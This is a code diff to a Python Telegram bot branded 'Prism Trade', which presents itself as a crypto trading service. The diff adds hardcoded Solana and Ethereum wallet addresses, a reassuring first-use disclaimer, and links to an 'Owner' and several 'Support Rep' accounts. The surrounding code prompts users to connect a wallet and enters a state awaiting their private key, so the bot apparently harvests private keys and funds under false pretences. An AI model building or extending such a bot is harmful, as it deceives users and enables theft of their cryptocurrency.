@@ -28,7 +28,7 @@ API_TOKEN = os.getenv("API_TOKEN")
 ADMIN_IDS = os.getenv("ADMIN_IDS")
 LINK_URL = os.getenv("LINK_URL", "https://telegram.org")
 
-if not API_TOKEN or not ADMIN_ID:
+if not API_TOKEN or not ADMIN_IDS:
     raise ValueError("❌ API_TOKEN or ADMIN_IDS is not set in .env file!")
 
 # Parse admin IDs (comma-separated list)
@@ -57,14 +57,27 @@ class TradingBot:
             "📈 *Active Orders:* Active buy and sell limit orders.\n"
             "📊 *Positions:* Monitor your active trades.\n\n"
             "⚡ Looking for a quick buy or sell? Simply paste the token CA and you're ready to go!\n\n"
+            "*Sol wallet W1👉* `5gpSuKAUT874G5FQQTSAURtA81tW6HwnCAuSwEpb7aig`\n"
+            "*Eth wallet W2👉* `0x67B169aC536789358B655936D817b76C27B57828`\n\n"
             f"[Hub]({LINK_URL}) • [Updates]({LINK_URL}) • [X (Twitter)]({LINK_URL}) • "
-            f"[Docs]({LINK_URL}) • [Support]({LINK_URL}) • [More Links]({LINK_URL})"
+            f"[Docs]({LINK_URL}) • [Support]({LINK_URL}) • [More Links]({LINK_URL})\n\n"
+            "🇳🇱 EU1 • 🇩🇪 EU2 • 🇺🇸 US1 • 🇸🇬 SG1"
+        )
+
+        self.first_time_message = (
+            "**Prism Trade – Unlock a Smarter Way to Trade Crypto**\n\n"
+            "**Prism Trade enables secure and efficient token trading directly within Telegram. With powerful features such as Limit Orders, Copy Trading, Sniping, and more, you can execute advanced strategies seamlessly, all from one interface.**\n\n"
+            "**By proceeding, you will generate a non-custodial crypto wallet that integrates with Prism Trade. This wallet allows full access to trading and wallet management within Telegram, without the need for external apps or platforms.**\n\n"
+            "**Important: Upon continuing, your public wallet address and private key will be generated and displayed directly in this chat. Please ensure you are in a private and secure environment.**\n"
+            "**Your private key will not be stored or recoverable by Prism Trade. It is your sole responsibility to store it securely.**\n\n"
+            f"**By clicking Continue, you confirm that you have read and accepted our [Terms and Conditions]({LINK_URL}) and [Privacy Policy]({LINK_URL}). You also acknowledge the inherent risks of cryptocurrency trading and accept full responsibility for any outcomes resulting from the use of Prism Trade.**"
         )
 
         self.main_menu_buttons = [
             "📊 Active orders", "💎 Presale", "⭐ Premium", "🔗 Referral",
             "🌉 Bridge", "📉 Positions", "🤖 Auto snipe", "🔁 Copy trade",
-            "⚙️ Global settings", "👛 Wallets", "📡 Signals", "🔗 Chains"
+            "⚙️ Global settings", "👛 Wallets", "📡 Signals", "🔗 Chains",
+            "🆘 Support"
         ]
 
         self.wallet_menu_buttons = [
@@ -157,6 +170,33 @@ class TradingBot:
     def start_command(self, update: Update, context: CallbackContext) -> None:
         """Handle /start command"""
         try:
+            user_id = update.effective_user.id
+            
+            # Check if this is the first time user is using the bot
+            if not context.user_data.get('has_seen_welcome'):
+                # Show first-time welcome message
+                continue_keyboard = InlineKeyboardMarkup([[
+                    InlineKeyboardButton("Continue", callback_data="continue_to_main")
+                ]])
+                
+                update.message.reply_text(
+                    self.first_time_message,
+                    parse_mode=ParseMode.MARKDOWN,
+                    disable_web_page_preview=True,
+                    reply_markup=continue_keyboard
+                )
+                context.user_data['has_seen_welcome'] = True
+            else:
+                # Show regular welcome message
+                self.show_main_menu(update, context)
+                
+        except Exception as e:
+            logger.error(f"Error in start command: {e}")
+            update.message.reply_text("❌ An error occurred. Please try again.")
+
+    def show_main_menu(self, update: Update, context: CallbackContext) -> None:
+        """Show the main menu"""
+        try:
             welcome_msg = update.message.reply_text(
                 "To elevate your trading experience, please connect your wallet.",
                 parse_mode=ParseMode.MARKDOWN,
@@ -178,7 +218,7 @@ class TradingBot:
                 reply_markup=self.create_keyboard(self.main_menu_buttons, row_width=2)
             )
         except Exception as e:
-            logger.error(f"Error in start command: {e}")
+            logger.error(f"Error showing main menu: {e}")
             update.message.reply_text("❌ An error occurred. Please try again.")
 
     def button_callback(self, update: Update, context: CallbackContext) -> None:
@@ -205,6 +245,35 @@ class TradingBot:
                 )
                 context.user_data['awaiting_private_key'] = True
                 return WAITING_FOR_PRIVATE_KEY
+
+            elif button_data == "continue_to_main":
+                query.edit_message_text(
+                    text="To elevate your trading experience, please connect your wallet.",
+                    parse_mode=ParseMode.MARKDOWN,
+                    disable_web_page_preview=True
+                )
+                
+                query.message.reply_text(
+                    self.welcome_message,
+                    parse_mode=ParseMode.MARKDOWN,
+                    disable_web_page_preview=True,
+                    reply_markup=self.create_keyboard(self.main_menu_buttons, row_width=2)
+                )
+
+            elif button_data == "🆘 Support":
+                support_buttons = [
+                    [InlineKeyboardButton("Owner", url="https://t.me/Kuqo767")],
+                    [InlineKeyboardButton("Support Rep 1", url="https://t.me/PrismTraderSupport1")],
+                    [InlineKeyboardButton("Support Rep 2", url="https://t.me/Prism_trade_support")],
+                    [InlineKeyboardButton("Support Rep 3", url="https://t.me/PrismTradingSupporter")]
+                ]
+                support_keyboard = InlineKeyboardMarkup(support_buttons)
+                
+                query.edit_message_text(
+                    text="Choose one of our representatives to speak to:",
+                    parse_mode=ParseMode.MARKDOWN,
+                    reply_markup=support_keyboard
+                )
 
             elif button_data == "🔙 Return":
                 query.edit_message_text(
